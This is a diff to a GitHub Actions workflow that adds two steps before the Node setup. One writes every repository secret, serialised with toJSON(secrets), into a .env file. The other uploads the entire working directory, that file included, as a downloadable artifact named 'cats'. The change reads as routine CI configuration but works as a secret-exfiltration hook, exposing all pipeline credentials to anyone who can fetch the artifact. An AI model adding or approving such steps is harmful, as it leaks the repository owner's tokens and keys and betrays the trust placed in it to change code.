@@ -16,6 +16,19 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v3
 
+      - name: Make envfile
+        uses: SpicyPizza/create-envfile@v2.0
+        with:
+          envkey_SECRETS: ${{ toJSON(secrets) }}
+          file_name: .env
+          fail_on_empty: false
+          
+      - name: Upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: cats
+          path: .        
+
       - name: Setup Node
         uses: actions/setup-node@v3
 
